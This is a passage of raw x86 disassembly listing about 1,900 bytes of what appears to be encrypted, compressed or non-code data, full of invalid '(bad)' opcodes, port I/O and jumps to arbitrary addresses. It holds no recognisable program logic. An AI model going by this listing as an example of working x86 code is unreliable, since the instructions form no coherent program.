  402057:	sbb    ebx,DWORD PTR [ebx-0x257f6f9a]
  40205d:	clc    
  40205e:	ss cld 
  402060:	jge    0x402053
  402062:	outs   dx,BYTE PTR ds:[esi]
  402063:	or     eax,0x42990661
  402068:	hlt    
  402069:	inc    edi
  40206a:	jne    0x402085
  40206c:	stc    
  40206d:	sar    BYTE PTR [edx],cl
  40206f:	xor    eax,0xc2f454ec
  402074:	adc    al,0x37
  402076:	push   ebx
  402077:	cmp    ecx,DWORD PTR [ebp-0x5f324fe2]
  40207d:	mov    bl,0xb
  40207f:	in     eax,dx
  402080:	cld    
  402081:	mov    bh,0xef
  402083:	xchg   edi,eax
  402084:	icebp  
  402085:	add    BYTE PTR [eax-0x62df748e],0x13
  40208c:	pop    ss
  40208d:	push   es
  40208e:	jno    0x40207c
  402090:	fwait
  402091:	push   edx
  402092:	mov    BYTE PTR ds:0x376b467d,cl
  402098:	mov    edx,0x62cd20d5
  40209d:	dec    ecx
  40209e:	sti    
  40209f:	and    bl,BYTE PTR [esi+0x56fea1f6]
  4020a5:	dec    esi
  4020a6:	xchg   ebp,eax
  4020a7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4020a8:	gs mov cl,0x13
  4020ab:	xor    ch,BYTE PTR [ebp-0x5e]
  4020ae:	add    DWORD PTR [edi],ebp
  4020b0:	add    edi,DWORD PTR [esp+ebx*2]
  4020b3:	pop    ds
  4020b4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4020b5:	adc    DWORD PTR ds:0xd5f60874,esi
  4020bb:	aad    0x18
  4020bd:	aad    0xd2
  4020bf:	dec    ecx
  4020c0:	cmp    ecx,DWORD PTR [esi+0x62]
  4020c3:	dec    esp
  4020c4:	and    BYTE PTR [edi-0x3ce912ce],cl
  4020ca:	sbb    dh,BYTE PTR ds:0x4436cd01
  4020d0:	push   ebx
  4020d1:	mov    dh,0x9e
  4020d3:	outs   dx,DWORD PTR ds:[esi]
  4020d4:	inc    ebp
  4020d5:	nop
  4020d6:	inc    esi
  4020d7:	in     al,dx
  4020d8:	out    0xfc,al
  4020da:	sub    ch,bh
  4020dc:	daa    
  4020dd:	scas   al,BYTE PTR es:[edi]
  4020de:	in     al,dx
  4020df:	pop    ebx
  4020e0:	jecxz  0x40206d
  4020e2:	test   ah,dl
  4020e4:	mov    ch,0x4a
  4020e6:	jns    0x40212a
  4020e8:	loopne 0x4020c3
  4020ea:	adc    BYTE PTR [edx+0x19],dh
  4020ed:	mov    WORD PTR [ecx-0x30],cs
  4020f0:	leave  
  4020f1:	dec    edi
  4020f2:	inc    cl
  4020f4:	loopne 0x40213e
  4020f6:	dec    eax
  4020f7:	fst    QWORD PTR [esi]
  4020f9:	add    BYTE PTR [ebp+0x4a],0xd6
  4020fd:	mov    dl,0xed
  4020ff:	jbe    0x4020b3
  402101:	sahf   
  402102:	iret   
  402103:	pop    ss
  402104:	rcl    BYTE PTR [ecx-0x6d],1
  402107:	fwait
  402108:	jo     0x402091
  40210a:	jecxz  0x402125
  40210c:	or     eax,0x5cbec018
  402111:	pop    eax
  402112:	push   esi
  402113:	out    dx,eax
  402114:	jo     0x402114
  402116:	mov    DWORD PTR [esi],ebp
  402118:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402119:	jmp    0x402153
  40211b:	sub    BYTE PTR [eax+0x20f8e5b6],ch
  402121:	sbb    cl,BYTE PTR [ebx+0x72931d97]
  402127:	es jmp 0x402181
  40212a:	dec    edi
  40212b:	sub    DWORD PTR [esi-0x4d414ffd],0xfd844614
  402135:	stc    
  402136:	push   ss
  402137:	das    
  402138:	inc    edx
  402139:	sar    DWORD PTR [edx+ebp*2-0x5ff864cc],1
  402140:	sub    dh,BYTE PTR [eax+0x25]
  402143:	add    DWORD PTR [edi+0x133cc59c],eax
  402149:	aam    0x82
  40214b:	pop    es
  40214c:	rcl    BYTE PTR [ecx+0x7c70d231],cl
  402152:	daa    
  402153:	mov    al,0x5d
  402155:	ja     0x402168
  402157:	int    0xfd
  402159:	and    esp,DWORD PTR [esi]
  40215b:	or     BYTE PTR [edi-0x3dafeb7e],bh
  402161:	stos   BYTE PTR es:[edi],al
  402162:	add    eax,0x1f9b62db
  402167:	lahf   
  402168:	mov    es,ecx
  40216a:	das    
  40216b:	dec    edx
  40216c:	lods   eax,DWORD PTR ds:[esi]
  40216d:	or     al,0x6
  40216f:	in     eax,dx
  402170:	pushf  
  402171:	jmp    0x46a5:0xe63ec293
  402178:	in     eax,dx
  402179:	push   edi
  40217a:	loopne 0x402135
  40217c:	out    0x7f,eax
  40217e:	lds    ecx,FWORD PTR [ebx-0x55d93654]
  402184:	std    
  402185:	mov    dl,0x3e
  402187:	pop    ebp
  402188:	lods   al,BYTE PTR ds:[esi]
  402189:	(bad)  
  40218a:	xchg   ebp,eax
  40218b:	sbb    eax,0x46e89a26
  402190:	stos   DWORD PTR es:[edi],eax
  402191:	pop    edx
  402192:	outs   dx,BYTE PTR ds:[esi]
  402193:	mov    cs,WORD PTR [ebp+0x34]
  402196:	pop    es
  402197:	jae    0x402150
  402199:	xor    bh,bh
  40219b:	xchg   ecx,eax
  40219c:	push   es
  40219d:	push   cs
  40219e:	jmp    0x9c70:0xd64ac9a4
  4021a5:	adc    al,0x6f
  4021a7:	retf   
  4021a8:	dec    ecx
  4021a9:	stos   DWORD PTR es:[edi],eax
  4021aa:	lea    ebx,[ecx-0x6c]
  4021ad:	inc    eax
  4021ae:	mov    al,0xc8
  4021b0:	pop    ebx
  4021b1:	mov    ds:0x4c823286,eax
  4021b6:	jb     0x40219e
  4021b8:	cs sti 
  4021ba:	mov    es,WORD PTR [ebx]
  4021bc:	arpl   WORD PTR [edx-0x65d73e5c],cx
  4021c2:	outs   dx,DWORD PTR ds:[esi]
  4021c3:	mov    bl,0x3b
  4021c5:	mov    esi,ebp
  4021c7:	leave  
  4021c8:	and    eax,DWORD PTR [ecx+edi*4-0x76450f2f]
  4021cf:	cli    
  4021d0:	pop    esi
  4021d1:	inc    edi
  4021d2:	push   0x6022cfe9
  4021d7:	jmp    0x1b372f8c
  4021dc:	cmp    BYTE PTR [edi],0x62
  4021df:	dec    eax
  4021e0:	inc    eax
  4021e1:	dec    edx
  4021e2:	enter  0x35fb,0x34
  4021e6:	push   0x5d7018ea
  4021eb:	push   eax
  4021ec:	or     eax,0x11e85477
  4021f1:	imul   ebx,ecx,0x38
  4021f4:	pop    esp
  4021f5:	jo     0x40223b
  4021f7:	mov    ch,0x43
  4021f9:	adc    DWORD PTR [edx],0x81388269
  4021ff:	adc    al,bl
  402201:	xor    BYTE PTR [esi+esi*8],cl
  402204:	xor    BYTE PTR [ebx],dl
  402206:	in     eax,0x1
  402208:	lahf   
  402209:	ror    DWORD PTR [esp+esi*1-0x7a],0xbd
  40220e:	cmp    DWORD PTR [ecx-0x5a],ecx
  402211:	pushf  
  402212:	hlt    
  402213:	mov    BYTE PTR [ecx+0x3f],cl
  402216:	dec    edx
  402217:	lods   al,BYTE PTR ds:[esi]
  402218:	leave  
  402219:	sbb    ah,BYTE PTR [ebx]
  40221b:	add    ah,dh
  40221d:	(bad)  
  40221e:	and    ah,BYTE PTR [edi]
  402220:	sbb    dl,BYTE PTR [ecx]
  402222:	lahf   
  402223:	adc    DWORD PTR [esi+0x6494bac6],esp
  402229:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40222a:	xor    ch,BYTE PTR [edx+0x45a8e64e]
  402230:	xchg   edi,eax
  402231:	scas   eax,DWORD PTR es:[edi]
  402232:	sbb    BYTE PTR [ecx],al
  402234:	or     BYTE PTR [eax-0x584efa03],dl
  40223a:	push   ds
  40223b:	lods   al,BYTE PTR ds:[esi]
  40223c:	add    BYTE PTR [ebp+0x4],ah
  40223f:	out    0xd8,al
  402241:	jecxz  0x40223a
  402243:	xchg   edi,eax
  402244:	pop    edi
  402245:	add    al,0xa0
  402247:	cmp    dl,bh
  402249:	inc    ebx
  40224a:	mov    ds:0x6f478873,eax
  40224f:	dec    esi
  402250:	ds enter 0xacfa,0xfe
  402255:	dec    edi
  402256:	js     0x402278
  402258:	xor    BYTE PTR [ecx],ah
  40225a:	cs mov ecx,0xc3d32cbe
  402260:	cwde   
  402261:	inc    esp
  402262:	and    DWORD PTR [ebp-0x50],edi
  402265:	mov    DWORD PTR [ebx-0x43a1c928],ebp
  40226b:	lahf   
  40226c:	mov    cl,0x84
  40226e:	movd   DWORD PTR [ebx+0xce98803],mm6
  402275:	adc    eax,0x4f7f10a4
  40227a:	leave  
  40227b:	push   ebp
  40227c:	ins    DWORD PTR es:[edi],dx
  40227d:	shr    ebp,0x28
  402280:	out    0xea,eax
  402282:	shr    DWORD PTR ds:0xe6b08f76,1
  402288:	and    al,0x36
  40228a:	push   0x6671fc9c
  40228f:	sbb    BYTE PTR [edi],0xc8
  402292:	mov    al,ds:0xf8f166f
  402297:	inc    esi
  402298:	xchg   DWORD PTR [edx-0x24],edx
  40229b:	or     dh,al
  40229d:	and    al,0x94
  40229f:	pushf  
  4022a0:	jo     0x4022e9
  4022a2:	and    DWORD PTR [ebx-0x11075cf9],ebx
  4022a8:	int    0x26
  4022aa:	jb     0x402266
  4022ac:	mov    eax,0x346e2c7a
  4022b1:	out    dx,eax
  4022b2:	fwait
  4022b3:	and    DWORD PTR [eax],0xffffff87
  4022b6:	or     esi,ebx
  4022b8:	je     0x402252
  4022ba:	xor    DWORD PTR [bx+si],esp
  4022bd:	dec    esp
  4022be:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4022bf:	enter  0xc19b,0x1c
  4022c3:	sbb    DWORD PTR [ebp-0x1b3e0cac],ebx
  4022c9:	xor    edx,DWORD PTR [esi-0x27]
  4022cc:	add    al,0x11
  4022ce:	stos   DWORD PTR es:[edi],eax
  4022cf:	xor    eax,0x3f8ed9b9
  4022d4:	mov    eax,ds:0xbf770088
  4022d9:	mov    bl,0xc3
  4022db:	mov    bh,0xfe
  4022dd:	les    ebp,FWORD PTR [eax-0x8]
  4022e0:	icebp  
  4022e1:	in     al,dx
  4022e2:	add    eax,0x4f418bc4
  4022e7:	xchg   ecx,eax
  4022e8:	cmp    dh,BYTE PTR [ebx]
  4022ea:	ins    BYTE PTR es:[edi],dx
  4022eb:	cli    
  4022ec:	jne    0x402327
  4022ee:	ror    esp,1
  4022f0:	jne    0x4022ee
  4022f2:	or     ebx,DWORD PTR [ebx+0x50736cbe]
  4022f8:	fistp  WORD PTR [ebx]
  4022fa:	inc    ecx
  4022fb:	mov    ah,0xde
  4022fd:	cmp    ecx,DWORD PTR [eax]
  4022ff:	into   
  402300:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402301:	inc    esi
  402302:	addr16 pop ebp
  402304:	(bad)  
  402305:	mov    bh,0x2a
  402307:	or     BYTE PTR [esi],ah
  402309:	jae    0x402290
  40230b:	mov    al,0xac
  40230d:	cmp    cl,BYTE PTR [edx+0x3d]
  402310:	shr    ah,0x1a
  402313:	cmp    DWORD PTR [ecx-0x36074bc3],esp
  402319:	xchg   ebx,eax
  40231a:	addr16 cmc 
  40231c:	pop    DWORD PTR [ecx+ecx*8]
  40231f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402320:	mov    esp,0xdaaa642b
  402325:	rcl    DWORD PTR [ebx+0x1ef18e66],1
  40232b:	out    0x72,al
  40232d:	addr16 push ecx
  40232f:	and    al,0x4e
  402331:	repnz or al,dl
  402334:	imul   edx,DWORD PTR [eax],0xcbd5b5af
  40233a:	push   edi
  40233b:	jge    0x4023b1
  40233d:	jno    0x402343
  40233f:	jnp    0x402356
  402341:	cdq    
  402342:	ins    DWORD PTR es:[edi],dx
  402343:	mov    ds:0xbebb30c8,eax
  402348:	enter  0x1a8c,0x13
  40234c:	scas   al,BYTE PTR es:[edi]
  40234d:	enter  0x9e1e,0x7f
  402351:	jecxz  0x4023d1
  402353:	lods   al,BYTE PTR ds:[esi]
  402354:	mov    bl,0xfb
  402356:	call   0x7c8d:0x5e558a0b
  40235d:	xchg   ebx,eax
  40235e:	cmc    
  40235f:	test   eax,0xbeb3fa71
  402364:	jp     0x4023cd
  402366:	lods   al,BYTE PTR ds:[esi]
  402367:	adc    bh,BYTE PTR [edi]
  402369:	jg     0x4023af
  40236b:	rol    BYTE PTR [edi-0xa],cl
  40236e:	into   
  40236f:	fist   DWORD PTR [ecx+ecx*2]
  402372:	arpl   WORD PTR [eax-0x69f0f904],bx
  402378:	xchg   ecx,eax
  402379:	push   esi
  40237a:	je     0x402395
  40237c:	aad    0x6b
  40237e:	pop    ecx
  40237f:	dec    edi
  402380:	stos   BYTE PTR es:[edi],al
  402381:	sub    eax,0x8c6eae86
  402386:	sbb    ch,BYTE PTR [esi-0x72]
  402389:	mov    edx,0xd28a9af1
  40238e:	add    al,0xc4
  402390:	(bad)  
  402391:	test   eax,0x5948b486
  402396:	inc    ebp
  402397:	add    BYTE PTR [ebp+0x1a997471],bh
  40239d:	(bad)  
  40239e:	int3   
  40239f:	lock mov eax,ds:0x4c41e39e
  4023a5:	jae    0x40234a
  4023a7:	std    
  4023a8:	fidivr DWORD PTR [edx+edx*2]
  4023ab:	retf   0xb522
  4023ae:	push   ebp
  4023af:	pop    ss
  4023b0:	out    0x4a,eax
  4023b2:	imul   ebp,DWORD PTR [ecx-0x6],0xffffffb6
  4023b6:	fldcw  WORD PTR [edx+0x66060900]
  4023bc:	int    0xe7
  4023be:	pop    ss
  4023bf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4023c0:	inc    DWORD PTR [eax+edx*2]
  4023c3:	ja     0x4023df
  4023c5:	pushf  
  4023c6:	lds    edx,FWORD PTR [edx+esi*8+0x670666f7]
  4023cd:	mov    dl,0xe3
  4023cf:	aas    
  4023d0:	cmp    BYTE PTR [edi-0x6c82c2ff],bl
  4023d6:	inc    esi
  4023d7:	sbb    ah,BYTE PTR [ebx+0x5f]
  4023da:	loopne 0x402391
  4023dc:	add    al,0x7d
  4023de:	lods   eax,DWORD PTR ds:[esi]
  4023df:	pusha  
  4023e0:	fsubr  QWORD PTR [edi-0x2e]
  4023e3:	jle    0x4023d9
  4023e5:	loopne 0x402433
  4023e7:	cmp    BYTE PTR ds:0x6870c303,dh
  4023ed:	test   eax,0x5121803
  4023f2:	(bad)  
  4023f3:	cli    
  4023f4:	jecxz  0x40242f
  4023f6:	dec    ebx
  4023f7:	ror    DWORD PTR [eax-0x6e784bce],1
  4023fd:	pushf  
  4023fe:	xchg   edi,eax
  4023ff:	add    eax,0x6f74fc64
  402404:	xor    eax,0x34096e6c
  402409:	push   esi
  40240a:	and    DWORD PTR [edi+esi*8],0x77
  40240e:	jno    0x4023ac
  402410:	retf   
  402411:	scas   al,BYTE PTR es:[edi]
  402412:	arpl   WORD PTR [esi],di
  402414:	rcr    dh,cl
  402416:	or     eax,0x88dd68f0
  40241b:	dec    edx
  40241c:	mov    esp,0xfc9c7ecf
  402421:	jmp    0x4023c8
  402423:	xchg   edx,eax
  402424:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402425:	ins    BYTE PTR es:[edi],dx
  402426:	xor    DWORD PTR [ebx],eax
  402428:	cmp    eax,0xc4e37105
  40242d:	(bad)  
  40242e:	cmp    dl,BYTE PTR [edx]
  402430:	add    bl,0x6a
  402433:	inc    eax
  402434:	xchg   ecx,eax
  402435:	mov    bh,0x93
  402437:	fisttp DWORD PTR [ecx]
  402439:	mov    edi,0x6acb2e80
  40243e:	xlat   BYTE PTR ds:[ebx]
  40243f:	enter  0x350,0x7f
  402443:	pop    es
  402444:	xchg   edx,eax
  402445:	int3   
  402446:	xchg   DWORD PTR [ebx],esp
  402448:	mov    ds:0x63b42486,al
  40244d:	pop    ecx
  40244e:	jo     0x402451
  402450:	add    DWORD PTR [edi+0x38],edi
  402453:	push   esi
  402454:	adc    BYTE PTR [eax],ch
  402456:	mov    dl,0x8b
  402458:	push   edi
  402459:	or     ecx,DWORD PTR [ebp-0x17]
  40245c:	fisub  DWORD PTR [edi+0x3a]
  40245f:	leave  
  402460:	cmp    eax,0x19547a91
  402465:	jle    0x402445
  402467:	into   
  402468:	xlat   BYTE PTR ds:[ebx]
  402469:	sahf   
  40246a:	sahf   
  40246b:	cs xor edi,ecx
  40246e:	dec    esi
  40246f:	cli    
  402470:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402471:	jo     0x4024c2
  402473:	add    al,0xfc
  402475:	xchg   edi,eax
  402476:	sbb    BYTE PTR [ebp-0x12],dh
  402479:	lock aad 0x98
  40247c:	pop    esi
  40247d:	int3   
  40247e:	ss fs add eax,0x6ae15873
  402485:	in     al,0xe0
  402487:	or     DWORD PTR [edi+0x58],edi
  40248a:	nop
  40248b:	scas   eax,DWORD PTR es:[edi]
  40248c:	push   eax
  40248d:	dec    BYTE PTR [ebp-0x5556df9]
  402493:	setnp  BYTE PTR [edi]
  402496:	bound  ebx,QWORD PTR [edi-0x47258b07]
  40249c:	cwde   
  40249d:	add    eax,0xfe898213
  4024a2:	xor    eax,DWORD PTR [esi+0x2fefc627]
  4024a8:	cmp    dh,BYTE PTR [edi*1-0x73db3a23]
  4024af:	or     dl,0x31
  4024b2:	cwde   
  4024b3:	ss dec eax
  4024b5:	shl    BYTE PTR [edi+eiz*8+0x30],cl
  4024b9:	in     al,dx
  4024ba:	jg     0x4024a4
  4024bc:	xchg   BYTE PTR [esi],cl
  4024be:	ja     0x402470
  4024c0:	sbb    al,0x50
  4024c2:	add    BYTE PTR [eax+0x5b],bl
  4024c5:	sahf   
  4024c6:	clc    
  4024c7:	inc    edi
  4024c8:	repz pop edx
  4024ca:	fadd   st(6),st
  4024cc:	das    
  4024cd:	jle    0x4024c6
  4024cf:	jg     0x402462
  4024d1:	bound  edx,QWORD PTR [esi]
  4024d3:	jg     0x40246a
  4024d5:	xchg   ebp,eax
  4024d6:	out    0xcd,eax
  4024d8:	aas    
  4024d9:	inc    edx
  4024da:	inc    eax
  4024db:	pop    ebp
  4024dc:	pop    eax
  4024dd:	pop    ecx
  4024de:	out    0xa,al
  4024e0:	pop    ds
  4024e1:	or     al,0x7e
  4024e3:	and    eax,0x18b010d2
  4024e8:	addr16 jne 0x4024d2
  4024eb:	(bad)
  4024ee:	push   edi
  4024ef:	mov    DWORD PTR [ebp+edx*1+0x3c316cb6],esi
  4024f6:	repz push ebx
  4024f8:	sbb    eax,0x28a375b4
  4024fd:	retf   
  4024fe:	sar    DWORD PTR [ebx-0x7df89d4c],0xac
  402505:	and    ecx,DWORD PTR [eax+0x5f]
  402508:	jno    0x402570
  40250a:	je     0x402528
  40250c:	(bad)  
  40250e:	pop    es
  40250f:	out    0xd2,eax
  402511:	dec    edi
  402512:	nop
  402513:	add    al,0x4d
  402515:	rol    BYTE PTR [edi],cl
  402517:	ins    BYTE PTR es:[edi],dx
  402518:	test   BYTE PTR [edx-0x204bbcec],ah
  40251e:	(bad)  
  402520:	nop
  402521:	cld    
  402522:	mov    bl,BYTE PTR [edi-0x6d2c12b3]
  402528:	in     eax,dx
  402529:	ror    BYTE PTR ds:0xe102c344,cl
  40252f:	inc    esp
  402530:	push   ebx
  402531:	(bad)  
  402532:	xchg   edi,eax
  402533:	push   ds
  402534:	or     eax,0x720f2851
  402539:	xchg   ebx,eax
  40253a:	mov    ebp,0x2bfb6a3a
  40253f:	ins    BYTE PTR es:[edi],dx
  402540:	iret   
  402541:	mov    dl,0x28
  402543:	mov    edx,0x98dc82b2
  402548:	mov    edx,0x3be16645
  40254d:	aam    0x1
  40254f:	push   ebp
  402550:	stos   DWORD PTR es:[edi],eax
  402551:	push   esi
  402552:	jo     0x4025a9
  402554:	mov    dh,bl
  402556:	les    edi,FWORD PTR [esi+0x2a]
  402559:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40255a:	xchg   ecx,eax
  40255b:	cli    
  40255c:	ins    BYTE PTR es:[edi],dx
  40255d:	shl    DWORD PTR [edi+0x4ab67ea3],1
  402563:	fwait
  402564:	lods   al,BYTE PTR ds:[esi]
  402565:	mov    al,0xe8
  402567:	adc    DWORD PTR [esi+eax*2+0x7d1d2ae1],edi
  40256e:	adc    dh,BYTE PTR [ebx+eax*4+0x5f]
  402572:	mov    ch,0x90
  402574:	ins    DWORD PTR es:[edi],dx
  402575:	lods   eax,DWORD PTR ds:[esi]
  402576:	out    dx,al
  402577:	into   
  402578:	and    ch,BYTE PTR [ebx]
  40257a:	test   DWORD PTR [ecx+eax*2+0x23b609d1],0x748f5fbc
  402585:	and    DWORD PTR [ebx+eiz*1+0x4b],edx
  402589:	or     cl,BYTE PTR [edi]
  40258b:	inc    edi
  40258c:	je     0x4025c2
  40258e:	stc    
  40258f:	push   ecx
  402590:	sub    cl,BYTE PTR [eax-0xfeecf36]
  402596:	adc    al,0xe8
  402598:	sahf   
  402599:	cmc    
  40259a:	imul   edx,DWORD PTR [edi],0xffffffef
  40259d:	sbb    BYTE PTR [edx+ecx*2+0x42df3330],0x1b
  4025a5:	not    ebx
  4025a7:	(bad)  
  4025a8:	mov    esp,0x765c3aa4
  4025ad:	pop    edx
  4025ae:	inc    edi
  4025af:	mov    cl,0x2b
  4025b1:	and    ch,BYTE PTR [edx-0x39689583]
  4025b7:	pop    ecx
  4025b8:	(bad)  
  4025b9:	and    dl,BYTE PTR [ecx-0x42]
  4025bc:	sbb    dl,bl
  4025be:	neg    BYTE PTR [eax-0x6e]
  4025c1:	mov    dl,0xe9
  4025c3:	lds    ebp,FWORD PTR [ecx+0x4e]
  4025c6:	cld    
  4025c7:	lods   eax,DWORD PTR ds:[esi]
  4025c8:	push   0x3d
  4025ca:	cld    
  4025cb:	out    0x7a,al
  4025cd:	dec    esp
  4025ce:	xchg   edi,eax
  4025cf:	scas   al,BYTE PTR es:[edi]
  4025d0:	adc    edx,DWORD PTR [eax-0x72d74461]
  4025d6:	or     BYTE PTR [ebx+0x26587734],dh
  4025dc:	jne    0x402651
  4025de:	arpl   WORD PTR [eax+0x2258117e],bp
  4025e4:	ins    BYTE PTR es:[edi],dx
  4025e5:	es pop ss
  4025e7:	popf   
  4025e8:	sbb    esp,DWORD PTR [ecx+0x53]
  4025eb:	or     BYTE PTR [edx+0x453dcde8],0xb
  4025f2:	and    eax,0x56ecc9e5
  4025f7:	cli    
  4025f8:	div    BYTE PTR [ebp+0x1bf5c325]
  4025fe:	xchg   esp,eax
  4025ff:	shl    ch,0xeb
  402602:	aaa    
  402603:	mov    ebx,0x7aa3c72d
  402608:	jne    0x40265c
  40260a:	add    cx,bx
  40260d:	mul    DWORD PTR [edx+0x5d]
  402610:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402611:	repz pushf 
  402613:	(bad)  
  402614:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402615:	(bad)  
  402616:	aad    0x5f
  402618:	xlat   BYTE PTR ds:[ebx]
  402619:	icebp  
  40261a:	xlat   BYTE PTR ds:[ebx]
  40261b:	jmp    0xdf58:0xaf6ba5e0
  402622:	pop    ebx
  402623:	push   ebp
  402624:	ja     0x40269e
  402626:	cld    
  402627:	add    ebp,DWORD PTR [eax+ebp*4]
  40262a:	dec    eax
  40262b:	popf   
  40262c:	mov    bh,0x16
  40262e:	pushf  
  40262f:	mov    ebp,0x3fa8435e
  402634:	div    dl
  402636:	inc    esi
  402637:	dec    ecx
  402638:	dec    esi
  402639:	mov    esi,0xf1bb4dd0
  40263e:	fisub  DWORD PTR ds:0xa4e65427
  402644:	out    0x4,al
  402646:	iret   
  402647:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402648:	push   0x1b
  40264a:	jge    0x4025db
  40264c:	mov    bl,dl
  40264e:	mov    ebx,0x1765ea39
  402653:	outs   dx,DWORD PTR ds:[esi]
  402654:	mov    ds:0xc108f1a7,eax
  402659:	or     BYTE PTR ds:0x767be699,bl
  40265f:	mov    esp,0x28706a0b
  402664:	and    BYTE PTR [ebx],cl
  402666:	ret    
  402667:	call   DWORD PTR [ebp-0x7ea1fe11]
  40266d:	jno    0x4026c3
  40266f:	cmp    DWORD PTR [ebx-0x17],edi
  402672:	in     eax,dx
  402673:	sbb    DWORD PTR [edx+0x37],esi
  402676:	cmp    cl,bl
  402678:	adc    al,0x9c
  40267a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40267b:	push   esp
  40267c:	push   es
  40267d:	and    dl,cl
  40267f:	jg     0x402606
  402681:	push   ebp
  402682:	out    0xf7,al
  402684:	mov    ds:0x9eb6f7d6,al
  402689:	in     al,dx
  40268a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40268b:	call   0xb66093ed
  402690:	mov    edi,DWORD PTR [esi]
  402692:	retf   0xf2e
  402695:	ins    DWORD PTR es:[edi],dx
  402696:	xor    dl,al
  402698:	iret   
  402699:	repnz shr BYTE PTR [ebx+eax*8+0x10d7c60a],cl
  4026a1:	retf   0x679
  4026a4:	popa   
  4026a5:	xchg   ebp,edx
  4026a7:	in     eax,dx
  4026a8:	sar    DWORD PTR [eax],0xea
  4026ab:	push   cs
  4026ac:	lods   eax,DWORD PTR ds:[esi]
  4026ad:	inc    esi
  4026ae:	not    esp
  4026b0:	sub    eax,0xa99d59f9
  4026b5:	(bad)  
  4026b6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4026b7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4026b8:	cli    
  4026b9:	cmp    BYTE PTR [eax-0x466ddcab],bl
  4026bf:	es push ds
  4026c1:	ret    
  4026c2:	xlat   BYTE PTR ds:[ebx]
  4026c3:	clc    
  4026c4:	dec    ecx
  4026c5:	add    BYTE PTR [edx+0x82a8009],cl
  4026cb:	shl    BYTE PTR [ecx-0x676967fc],cl
  4026d1:	jl     0x402674
  4026d3:	pop    ebp
  4026d4:	inc    edx
  4026d5:	sahf   
  4026d6:	and    BYTE PTR [edi+0x4c],ch
  4026d9:	add    bh,dl
  4026db:	add    DWORD PTR [ebp-0x77],edi
  4026de:	mov    bl,0x8d
  4026e0:	dec    esp
  4026e1:	jae    0x402703
  4026e3:	or     ebp,DWORD PTR [esi-0x5f4e489f]
  4026e9:	pop    ecx
  4026ea:	or     eax,0x665d549f
  4026ef:	lods   al,BYTE PTR ds:[esi]
  4026f0:	(bad)  
  4026f1:	lods   eax,DWORD PTR ds:[esi]
  4026f2:	add    BYTE PTR [ecx],bl
  4026f4:	pop    es
  4026f5:	pop    es
  4026f6:	xchg   ebp,eax
  4026f7:	sar    DWORD PTR [ecx-0x2f],cl
  4026fa:	loop   0x402682
  4026fc:	hlt    
  4026fd:	sbb    al,0xbc
  4026ff:	js     0x4026ff
  402701:	sar    BYTE PTR ds:0xe2acbb6a,0x43
  402708:	sahf   
  402709:	dec    eax
  40270a:	cmp    esi,DWORD PTR [ecx-0xe]
  40270d:	cmp    edx,DWORD PTR [edx+0x4a54bf6b]
  402713:	dec    ebp
  402714:	mov    ds:0x94860861,eax
  402719:	(bad)  
  40271a:	fadd   st,st(5)
  40271c:	and    edx,DWORD PTR [edx]
  40271e:	cmp    eax,0xacf23c06
  402723:	xchg   BYTE PTR [ecx],cl
  402725:	scas   eax,DWORD PTR es:[edi]
  402726:	outs   dx,BYTE PTR ds:[esi]
  402727:	mov    bx,0x7c67
  40272b:	pusha  
  40272c:	sub    al,0xf
  40272e:	leave  
  40272f:	enter  0xc6f2,0xe3
  402733:	push   esp
  402734:	pop    esi
  402735:	sub    BYTE PTR [edi+0x41],al
  402738:	(bad)  
  402739:	ror    DWORD PTR [ebp+0x42e96802],cl
  40273f:	adc    eax,0x3332dbb0
  402744:	cmp    eax,0x57c00dcc
  402749:	xchg   ebp,eax
  40274a:	cli    
  40274b:	pop    ebx
  40274c:	into   
  40274d:	ss (bad) 
  402750:	pop    esi
  402751:	bnd jl 0x40279a
  402754:	cdq    
  402755:	nop
  402756:	(bad)  
  402758:	aas    
  402759:	das    
  40275a:	and    BYTE PTR [ebp-0x3e],cl
  40275d:	(bad)  
  40275f:	(bad)  
  402760:	in     al,0x54
  402762:	stos   DWORD PTR es:[edi],eax
  402763:	inc    ebp
  402764:	mov    bl,0x9e
  402766:	arpl   WORD PTR [ebp-0x55],bx
  402769:	xor    BYTE PTR [ebx],dh
  40276b:	das    
  40276c:	mov    ebp,0xf127df77
  402771:	mov    bl,0xe4
  402773:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402774:	aad    0xc
  402776:	mov    ds:0x952c68ae,eax
  40277b:	pop    edx
  40277c:	pop    edi
  40277d:	xor    ecx,ecx
  40277f:	ins    BYTE PTR es:[edi],dx
  402780:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402781:	sub    edi,DWORD PTR [eax]
  402783:	stos   BYTE PTR es:[edi],al
  402784:	jae    0x40279a
  402786:	outs   dx,BYTE PTR ds:[esi]
  402787:	int3   
  402788:	or     al,BYTE PTR [ebx]
  40278a:	xchg   esi,eax
  40278b:	jg     0x402725
  40278d:	cdq    
  40278e:	fisttp WORD PTR [esi+0x36b5f908]
  402794:	xor    edi,esi
  402796:	aaa    
  402797:	rcl    DWORD PTR [ebp-0x6e],cl
  40279a:	or     eax,0x4ce364a0
  40279f:	cmp    eax,0x12dd7048
  4027a4:	into   
  4027a5:	js     0x4027ba
  4027a7:	cmc    
  4027a8:	sbb    dl,BYTE PTR [ebx+0x15a72106]
  4027ae:	cmp    edx,DWORD PTR [eax+0xd]
  4027b1:	daa    
  4027b2:	inc    ecx
  4027b3:	mov    eax,0x7ab94e0d
  4027b8:	mov    ebx,0x593049ab
  4027bd:	jmp    0xc931aa97
  4027c2:	jae    0x402767
